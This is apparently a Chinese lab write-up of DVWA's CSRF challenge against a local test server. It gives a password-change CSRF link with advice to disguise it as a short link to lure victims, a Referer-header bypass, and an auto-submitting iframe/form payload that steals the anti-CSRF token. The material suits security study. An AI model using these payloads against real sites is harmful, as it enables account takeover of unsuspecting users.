## low
### 攻击流程
1. 目标登陆网站(存csrf漏洞)并保持登陆状态
2. 构造payload(可以注册目标网站用户，拿取信息构建更合理的payload)
	`http://192.168.245.172:8012/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change#`
	在实际运用中可以将上面的链接转为**短链接**的方式进行伪装
3. 搭建虚假链接诱导目标点击（考虑同源策略，构建的虚拟web页面选择同一浏览器）![](./img/Pasted%20image%2020250810152514.png)
4. 用户点击即可修改（当然生活中几乎不可能遇到如此简单的。)
## medium 
### 攻击流程
1. 目标登陆网站(存csrf漏洞)并保持登陆状态
2. 构造payload(可以注册目标网站用户，拿取信息构建更合理的payload)
	`http://192.168.245.172:8012/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change#`
3. 搭建虚假链接诱导目标点击（考虑同源策略，构建的虚拟web页面选择同一浏览器）
4. 更改失败抓包对比
	虚假链接报文![](./img/Pasted%20image%2020250810153927.png)
	真实网页修改密码发送报文![](./img/Pasted%20image%2020250810154140.png)
	发现区别：
	虚假报文少了一个http消息头：`Referer: http://192.168.245.172:8012/vulnerabilities/csrf/`导致修改失败
	添加后就成功了![](./img/Pasted%20image%2020250810155404.png)
## high
### 法一（未成功）
```php
<?php f( isset( $_GET[ 'Change' ] ) ) {   
    // Check Anti-CSRF token   
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );   
    // Get input   
    $pass_new  = $_GET[ 'password_new' ];   
    $pass_conf = $_GET[ 'password_conf' ];   
    // Do the passwords match?   
    if( $pass_new == $pass_conf ) {   
        // They do!   
        $pass_new = mysql_real_escape_string( $pass_new );   
        $pass_new = md5( $pass_new );   
        // Update the database   
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";   
        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' );   
        // Feedback for the user   
        echo "<pre>Password Changed.</pre>";   
    }   
    else {   
        // Issue with passwords matching   
        echo "<pre>Passwords did not match.</pre>";   
    }   
    mysql_close();   
}   
// Generate Anti-CSRF token   
generateSessionToken();   
?>
```

```javascript窃取token，自动提交修改代码
<script type="text/javascript">  
    function attack()  
  {  
   document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;  
  document.getElementById("transfer").submit();  
  }  
</script>  
<iframe src="http://192.168.245.172:8012/vulnerabilities/csrf/" id="hack" border="0" style="display:none;"></iframe>  
<body onload="attack()">  
  <form method="GET" id="transfer" action="http://192.168.245.172:8012/vulnerabilities/csrf/">  
    <input type="hidden" name="password_new" value="password">  
	<input type="hidden" name="password_conf" value="password">  
    <input type="hidden" name="user_token" value="">  
   <input type="hidden" name="Change" value="Change">  
  </form></body>
```

